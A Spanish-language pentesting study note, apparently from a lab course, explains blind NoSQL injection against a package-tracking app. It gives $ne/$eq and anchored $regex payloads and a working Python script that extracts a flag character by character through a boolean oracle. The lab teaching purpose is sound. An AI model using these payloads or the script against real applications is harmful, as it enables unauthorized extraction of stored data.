---
tags:
  - Web/Red-Team
  - NoSQLi
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-16
Nota previa: "[[04 - Extracción de datos in-band]]"
Nota siguiente: "[[06 - Server-Side JavaScript Injection]]"
Area: "[[NoSQL Injection.base|NoSQL Injection]]"
---
---

Cuando la aplicación **no refleja** el dato —solo responde distinto según la consulta case algo o no— estamos en **blind NoSQL injection**. Se extrae bit a bit con un oráculo booleano y `$regex` anclado, exactamente igual que en la [[04 - Extracción de datos boolean-based|blind SQLi]] pero con operadores en vez de `substring()`.

# El oráculo booleano (MangoPost)

Una app de seguimiento de paquetes envía `{"trackingNum": <valor>}` y el servidor filtra por él (`find({trackingNum: <valor>})`). La respuesta difiere: un número válido devuelve los datos del envío; uno inválido, `This tracking number does not exist`. Esa diferencia es el oráculo:

```javascript
{"trackingNum": {"$ne": "x"}}   // ¿existe algún doc? → sí (positivo)
{"trackingNum": {"$eq": "x"}}   // → "no existe" (negativo)
```

# Extracción carácter a carácter con `$regex` anclado

Con el oráculo, se adivina el valor prefijo a prefijo usando `^` para anclar al inicio:

```javascript
{"trackingNum": {"$regex": "^.*"}}   // casa todo → devuelve el primer doc
{"trackingNum": {"$regex": "^0.*"}}  // ¿empieza por 0? → no
{"trackingNum": {"$regex": "^3.*"}}  // → sí → primer carácter = 3
{"trackingNum": {"$regex": "^32.*"}} // → sí → segundo = 2
```

<mark style="background: #ADCCFFA6;">Cada positivo extiende el prefijo conocido</mark>; se repite hasta reconstruir el valor completo.

# Automatizar (Python)

A mano es inviable. El patrón: una función `oracle()` que devuelve `True`/`False`, y un bucle posición × charset:

```python
import requests, json

def oracle(query):
    r = requests.post("http://TARGET/index.php",
                      headers={"Content-Type": "application/json"},
                      data=json.dumps({"trackingNum": query}))
    return "bmdyy" in r.text          # indicador positivo en la respuesta

# Verificar el oráculo con respuestas conocidas ANTES de volcar
assert oracle("X") == False
assert oracle({"$regex": "^HTB{.*"}) == True

# Volcar el valor char a char (formato conocido: HTB{[0-9a-f]{32}})
trackingNum = "HTB{"
for _ in range(32):
    for c in "0123456789abcdef":
        if oracle({"$regex": "^" + trackingNum + c + ".*"}):
            trackingNum += c
            break
trackingNum += "}"
print("Tracking Number:", trackingNum)
```

Con un charset pequeño (`0-9a-f`) el volcado tarda ~23 s.

> [!important]+ El patrón del oráculo
> Cualquier diferencia observable sirve de oráculo: "existe/no existe", longitud de la respuesta, código HTTP, tiempo. <mark style="background: #8000E1A6;">Verifica siempre el oráculo con un caso conocido-verdadero y uno conocido-falso (los `assert`) antes de lanzar el volcado</mark> — un oráculo mal calibrado extrae basura. Idéntico a la [[03 - Diseño del oráculo booleano|construcción del oráculo en blind SQLi]].

> [!warning]+ El tamaño del charset importa
> Cuantos más caracteres posibles, más peticiones. Para alfabetos grandes (imprimibles completos), <mark style="background: #FFB86CA6;">usa búsqueda binaria</mark> con `$gt`/`$lt` sobre el carácter en vez de probar uno a uno, reduciendo de ~N a ~log₂(N) por posición. Y si la app no refleja NADA (ni existe/no existe), queda el time-based forzando cómputo con [[06 - Server-Side JavaScript Injection|`$where`]].

Cuando el motor evalúa `$where`, la inyección escala de "leer datos" a "ejecutar código": [[06 - Server-Side JavaScript Injection]].
